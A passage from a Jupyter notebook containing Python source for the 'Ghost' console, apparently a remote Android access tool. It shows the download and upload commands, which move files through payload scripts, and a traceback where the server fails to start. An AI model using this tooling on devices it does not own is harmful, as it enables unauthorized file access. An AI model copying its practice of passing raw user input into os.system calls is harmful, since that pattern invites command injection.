    "                            print(\"Usage: download <remote_file> <local_path>\")\n",
    "                        else:\n",
    "                            dchk = os.popen(\"chmod +x data/check/dcheck.sh && data/check/dcheck.sh \"+con[1]).read()\n",
    "                            chk = os.popen(\"chmod +x data/check/check.sh && data/check/check.sh \"+con[1]).read()\n",
    "                            if chk == \"0\\n\":\n",
    "                                if dchk == \"0\\n\":\n",
    "                                    print(E+\"Error: \"+con[1]+\": not a file!\")\n",
    "                                else:\n",
    "                                    if os.path.isdir(con[2]):\n",
    "                                        if os.path.exists(con[2]):\n",
    "                                            rp = os.path.split(con[1])[1]\n",
    "                                            os.system(\"chmod +x data/payloads/download && data/payloads/download \"+con[1]+\" \"+con[2]+\" \"+rp)\n",
    "                                        else:\n",
    "                                            print(E+\"Local directory: \"+con[2]+\": does not exist!\")\n",
    "                                    else:\n",
    "                                        rp = os.path.split(con[2])[0]\n",
    "                                        if rp == \"\":\n",
    "                                            rp = \".\"\n",
    "                                        else:\n",
    "                                            pass\n",
    "                                        if os.path.exists(rp):\n",
    "                                            if os.path.isdir(rp):\n",
    "                                                rp = os.path.split(con[2])[1]\n",
    "                                                pr = os.path.split(con[1])[1]\n",
    "                                                os.system(\"chmod +x data/payloads/download && data/payloads/download \"+con[1]+\" \"+con[2]+\" \"+rp+\" \"+pr)\n",
    "                                            else:\n",
    "                                                print(E+\"Error: \"+rp+\": not a directory!\")\n",
    "                                        else:\n",
    "                                            print(E+\"Local directory: \"+rp+\": does not exist!\")\n",
    "                            else:\n",
    "                                print(E+\"Remote file: \"+con[1]+\": does not exist!\")\n",
    "                    elif con[0] == \"upload\":\n",
    "                        if len(con) < 3:\n",
    "                            print(\"Usage: upload <local_file> <remote_path>\")\n",
    "                        else:\n",
    "                            if os.path.exists(con[1]):\n",
    "                                if os.path.isdir(con[1]):\n",
    "                                    print(E+\"Error: \"+con[1]+\": not a file!\")\n",
    "                                else:\n",
    "                                    rp = con[2][::-1]\n",
    "                                    rp = rp[rp.index('/')+1:][::-1]\n",
    "                                    s = os.path.split(con[1])[1]\n",
    "                                    pr = os.path.split(con[2])[0]\n",
    "                                    lrp = con[1][::-1]\n",
    "                                    lrp = lrp[lrp.index('/')+1:][::-1]\n",
    "                                    a = os.path.split(con[2])[1]\n",
    "                                    os.system(\"chmod +x data/payloads/upload && data/payloads/upload \"+con[1]+\" \"+con[2]+\" \"+s+\" \"+pr+\" \"+lrp)\n",
    "                            else:\n",
    "                                print(E+\"Local file: \"+con[1]+\": does not exist!\")\n",
    "                    else:\n",
    "                        print(E+\"Unrecognized command!\")\n",
    "                    con = input('\\033[4mghost\\033[0m(\\033[1;31m'+device+'\\033[0m)> ').strip(\" \")\n",
    "                    con = con.split()\n",
    "        else:\n",
    "            print(E+\"Unrecognized command!\")\n",
    "        ui = input('\\033[4mghost\\033[0m> ').strip(\" \")\n",
    "        ui = ui.split()\n",
    "\n",
    "start_server()\n",
    "banner()\n",
    "main()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "ename": "SystemExit",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mSystemExit\u001b[0m                                Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-3-f93033f781c4>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m    405\u001b[0m         \u001b[0mui\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mui\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0msplit\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    406\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 407\u001b[1;33m \u001b[0mstart_server\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    408\u001b[0m \u001b[0mbanner\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    409\u001b[0m \u001b[0mmain\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32m<ipython-input-3-f93033f781c4>\u001b[0m in \u001b[0;36mstart_server\u001b[1;34m()\u001b[0m\n\u001b[0;32m     20\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0madb\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mstrip\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m\"\\n\"\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;33m==\u001b[0m \u001b[1;34m\"\"\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     21\u001b[0m         \u001b[0mprint\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mE\u001b[0m\u001b[1;33m+\u001b[0m\u001b[1;34m\"Failed to start Ghost Server!\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 22\u001b[1;33m         \u001b[0msys\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mexit\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m     23\u001b[0m     \u001b[1;32melse\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     24\u001b[0m         \u001b[0mos\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0msystem\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m\"chmod +x core/server.sh && core/server.sh stop\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mSystemExit\u001b[0m: "
     ]
    }
   ],
   "source": [
    "%tb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
